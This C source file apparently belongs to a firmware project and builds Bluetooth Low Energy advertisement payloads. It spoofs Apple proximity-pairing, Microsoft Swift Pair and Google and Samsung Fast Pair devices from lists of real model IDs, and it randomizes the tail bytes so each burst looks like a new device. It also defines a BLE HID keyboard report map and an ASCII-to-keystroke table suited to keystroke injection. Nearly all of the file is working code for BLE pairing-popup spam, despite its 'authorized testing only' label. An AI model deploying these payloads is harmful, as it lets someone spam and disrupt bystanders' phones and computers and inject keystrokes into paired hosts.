// nucleo_ble_adv — see nucleo_ble_adv.h. Pure AD payload assembly, host-testable. FOR AUTHORIZED
// TESTING ONLY. Non-essential tail bytes are randomized (via the rng callback) exactly as field tools
// do, so each burst looks like a different device; the structural bytes are fixed and gate-asserted.
#include "nucleo_ble_adv.h"
#include <string.h>

const uint16_t BLE_APPLE_MODELS[]   = { 0x0220, 0x0e20, 0x0a20, 0x0f20, 0x1320, 0x1420, 0x0320, 0x0520, 0x0620, 0x0920 };
const int      BLE_APPLE_MODELS_N   = (int)(sizeof(BLE_APPLE_MODELS) / sizeof(BLE_APPLE_MODELS[0]));
const uint32_t BLE_ANDROID_MODELS[] = { 0xCD8256, 0x0E30C3, 0x02D815, 0xF52494, 0x718FA4, 0x0000F0 };
const int      BLE_ANDROID_MODELS_N = (int)(sizeof(BLE_ANDROID_MODELS) / sizeof(BLE_ANDROID_MODELS[0]));
const uint32_t BLE_SAMSUNG_MODELS[] = { 0x9CFAE0, 0x4E1E1A, 0xA7E833, 0x0F86B7, 0x2D7A23 };
const int      BLE_SAMSUNG_MODELS_N = (int)(sizeof(BLE_SAMSUNG_MODELS) / sizeof(BLE_SAMSUNG_MODELS[0]));
const char *const BLE_SWIFT_NAMES[] = { "NucleoOS", "Wireless KB", "BT Speaker", "Headset", "Mouse", "Keyboard" };
const int      BLE_SWIFT_NAMES_N    = (int)(sizeof(BLE_SWIFT_NAMES) / sizeof(BLE_SWIFT_NAMES[0]));

int ble_adv_apple(uint32_t rot, uint8_t *b, ble_rng_fn rng)
{
    uint16_t model = BLE_APPLE_MODELS[rot % BLE_APPLE_MODELS_N];
    int i = 0;
    b[i++] = 0x1E;                       // AD length (30)
    b[i++] = 0xFF;                       // manufacturer specific data
    b[i++] = 0x4C; b[i++] = 0x00;        // Apple, Inc.
    b[i++] = 0x07;                       // Continuity type: proximity pairing
    b[i++] = 0x19;                       // proximity-pairing payload length (25)
    b[i++] = 0x07;                       // prefix
    b[i++] = (model >> 8) & 0xFF; b[i++] = model & 0xFF;
    b[i++] = 0x55;                       // status
    for (; i < BLE_ADV_MAX; i++) b[i] = rng ? rng() : 0;   // battery/color/"encrypted" tail
    return BLE_ADV_MAX;                  // 31
}

int ble_adv_swiftpair(uint32_t rot, uint8_t *b)
{
    const char *nm = BLE_SWIFT_NAMES[rot % BLE_SWIFT_NAMES_N];
    int nl = (int)strlen(nm), i = 0;
    b[i++] = (uint8_t)(6 + nl);          // AD length
    b[i++] = 0xFF;                       // manufacturer specific data
    b[i++] = 0x06; b[i++] = 0x00;        // Microsoft vendor ID
    b[i++] = 0x03;                       // beacon: Swift Pair (pairing over BLE)
    b[i++] = 0x00;                       // reserved
    b[i++] = 0x80;                       // flags
    memcpy(&b[i], nm, nl); i += nl;
    return i;
}

int ble_adv_fastpair(uint32_t model, uint8_t *b)
{
    int i = 0;
    b[i++] = 0x02; b[i++] = 0x01; b[i++] = 0x06;                 // flags (LE general disc, no BR/EDR)
    b[i++] = 0x06; b[i++] = 0x16; b[i++] = 0x2C; b[i++] = 0xFE;  // service data, Fast Pair UUID 0xFE2C
    b[i++] = (model >> 16) & 0xFF; b[i++] = (model >> 8) & 0xFF; b[i++] = model & 0xFF;  // 3-byte model ID
    b[i++] = 0x02; b[i++] = 0x0A; b[i++] = 0x00;                 // tx power
    return i;  // 13
}

int ble_adv_android(uint32_t rot, uint8_t *b) { return ble_adv_fastpair(BLE_ANDROID_MODELS[rot % BLE_ANDROID_MODELS_N], b); }
int ble_adv_samsung(uint32_t rot, uint8_t *b) { return ble_adv_fastpair(BLE_SAMSUNG_MODELS[rot % BLE_SAMSUNG_MODELS_N], b); }

// ---- HID report map: Report ID 1 = keyboard (8-byte: modifier, reserved, 6 keys + LED output),
// Report ID 2 = consumer/media (1-byte bitmap). Standard USB HID; works under Report Protocol on all
// modern hosts. 103 bytes of .rodata.
const uint8_t BLE_HID_REPORT_MAP[] = {
    // ===== Keyboard (Report ID 1) =====
    0x05, 0x01,        // Usage Page (Generic Desktop)
    0x09, 0x06,        // Usage (Keyboard)
    0xA1, 0x01,        // Collection (Application)
    0x85, 0x01,        //   Report ID (1)
    0x05, 0x07,        //   Usage Page (Keyboard/Keypad)
    0x19, 0xE0,        //   Usage Minimum (LeftControl)
    0x29, 0xE7,        //   Usage Maximum (RightGUI)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x01,        //   Logical Maximum (1)
    0x75, 0x01,        //   Report Size (1)
    0x95, 0x08,        //   Report Count (8)
    0x81, 0x02,        //   Input (Data,Var,Abs)        ; modifier bitmap (byte 0)
    0x95, 0x01,        //   Report Count (1)
    0x75, 0x08,        //   Report Size (8)
    0x81, 0x01,        //   Input (Const,Array,Abs)     ; reserved (byte 1)
    0x95, 0x05,        //   Report Count (5)            ; LED output report
    0x75, 0x01,        //   Report Size (1)
    0x05, 0x08,        //   Usage Page (LEDs)
    0x19, 0x01,        //   Usage Minimum (Num Lock)
    0x29, 0x05,        //   Usage Maximum (Kana)
    0x91, 0x02,        //   Output (Data,Var,Abs)
    0x95, 0x01,        //   Report Count (1)
    0x75, 0x03,        //   Report Size (3)
    0x91, 0x01,        //   Output (Const,Array,Abs)    ; LED padding
    0x95, 0x06,        //   Report Count (6)            ; 6 keycodes (bytes 2..7)
    0x75, 0x08,        //   Report Size (8)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x65,        //   Logical Maximum (101)
    0x05, 0x07,        //   Usage Page (Keyboard/Keypad)
    0x19, 0x00,        //   Usage Minimum (0)
    0x29, 0x65,        //   Usage Maximum (101)
    0x81, 0x00,        //   Input (Data,Array,Abs)
    0xC0,              // End Collection
    // ===== Consumer Control / media (Report ID 2) =====
    0x05, 0x0C,        // Usage Page (Consumer)
    0x09, 0x01,        // Usage (Consumer Control)
    0xA1, 0x01,        // Collection (Application)
    0x85, 0x02,        //   Report ID (2)
    0x15, 0x00,        //   Logical Minimum (0)
    0x25, 0x01,        //   Logical Maximum (1)
    0x75, 0x01,        //   Report Size (1)
    0x95, 0x06,        //   Report Count (6)
    0x09, 0xCD,        //   Usage (Play/Pause)      -> bit 0
    0x09, 0xB5,        //   Usage (Scan Next)       -> bit 1
    0x09, 0xB6,        //   Usage (Scan Previous)   -> bit 2
    0x09, 0xE9,        //   Usage (Volume Up)       -> bit 3
    0x09, 0xEA,        //   Usage (Volume Down)     -> bit 4
    0x09, 0xE2,        //   Usage (Mute)            -> bit 5
    0x81, 0x02,        //   Input (Data,Var,Abs)        ; 6-bit media bitmap
    0x95, 0x02,        //   Report Count (2)
    0x75, 0x01,        //   Report Size (1)
    0x81, 0x01,        //   Input (Const,Array,Abs)     ; 2 padding bits
    0xC0               // End Collection
};
const int BLE_HID_REPORT_MAP_N = (int)(sizeof(BLE_HID_REPORT_MAP));

bool ble_hid_ascii(char c, ble_hid_keystroke_t *out)
{
    uint8_t m = 0, k = 0;
    if (c >= 'a' && c <= 'z') { k = 0x04 + (c - 'a'); }
    else if (c >= 'A' && c <= 'Z') { m = BLE_HID_MOD_SHIFT; k = 0x04 + (c - 'A'); }
    else if (c >= '1' && c <= '9') { k = 0x1E + (c - '1'); }
    else if (c == '0') { k = 0x27; }
    else switch (c) {
        case '\n': case '\r': k = 0x28; break;   // Enter
        case 0x1B: k = 0x29; break;              // Esc
        case '\b': k = 0x2A; break;              // Backspace
        case '\t': k = 0x2B; break;              // Tab
        case ' ':  k = 0x2C; break;
        case '-':  k = 0x2D; break;   case '_': m = BLE_HID_MOD_SHIFT; k = 0x2D; break;
        case '=':  k = 0x2E; break;   case '+': m = BLE_HID_MOD_SHIFT; k = 0x2E; break;
        case '[':  k = 0x2F; break;   case '{': m = BLE_HID_MOD_SHIFT; k = 0x2F; break;
        case ']':  k = 0x30; break;   case '}': m = BLE_HID_MOD_SHIFT; k = 0x30; break;
        case '\\': k = 0x31; break;   case '|': m = BLE_HID_MOD_SHIFT; k = 0x31; break;
        case ';':  k = 0x33; break;   case ':': m = BLE_HID_MOD_SHIFT; k = 0x33; break;
        case '\'': k = 0x34; break;   case '"': m = BLE_HID_MOD_SHIFT; k = 0x34; break;
        case '`':  k = 0x35; break;   case '~': m = BLE_HID_MOD_SHIFT; k = 0x35; break;
        case ',':  k = 0x36; break;   case '<': m = BLE_HID_MOD_SHIFT; k = 0x36; break;
        case '.':  k = 0x37; break;   case '>': m = BLE_HID_MOD_SHIFT; k = 0x37; break;
        case '/':  k = 0x38; break;   case '?': m = BLE_HID_MOD_SHIFT; k = 0x38; break;
        case '!':  m = BLE_HID_MOD_SHIFT; k = 0x1E; break;
        case '@':  m = BLE_HID_MOD_SHIFT; k = 0x1F; break;
        case '#':  m = BLE_HID_MOD_SHIFT; k = 0x20; break;
        case '$':  m = BLE_HID_MOD_SHIFT; k = 0x21; break;
        case '%':  m = BLE_HID_MOD_SHIFT; k = 0x22; break;
        case '^':  m = BLE_HID_MOD_SHIFT; k = 0x23; break;
        case '&':  m = BLE_HID_MOD_SHIFT; k = 0x24; break;
        case '*':  m = BLE_HID_MOD_SHIFT; k = 0x25; break;
        case '(':  m = BLE_HID_MOD_SHIFT; k = 0x26; break;
        case ')':  m = BLE_HID_MOD_SHIFT; k = 0x27; break;
        default: return false;
    }
    out->mod = m; out->key = k;
    return true;
}

int ble_adv_ibeacon(uint8_t *b)
{
    static const uint8_t uuid[16] = { 0x4E, 0x55, 0x43, 0x4C, 0x45, 0x4F, 0x4F, 0x53,   // "NUCLEOOS"
                                      0x2D, 0x42, 0x4C, 0x45, 0x00, 0x00, 0x00, 0x01 };  // "-BLE" 0001
    int i = 0;
    b[i++] = 0x02; b[i++] = 0x01; b[i++] = 0x06;                 // flags
    b[i++] = 0x1A; b[i++] = 0xFF; b[i++] = 0x4C; b[i++] = 0x00;  // manuf, Apple
    b[i++] = 0x02; b[i++] = 0x15;                                // iBeacon type + length
    memcpy(&b[i], uuid, 16); i += 16;
    b[i++] = 0x00; b[i++] = 0x01;                                // major
    b[i++] = 0x00; b[i++] = 0x01;                                // minor
    b[i++] = 0xC5;                                               // measured power (-59 dBm)
    return i;  // 30
}
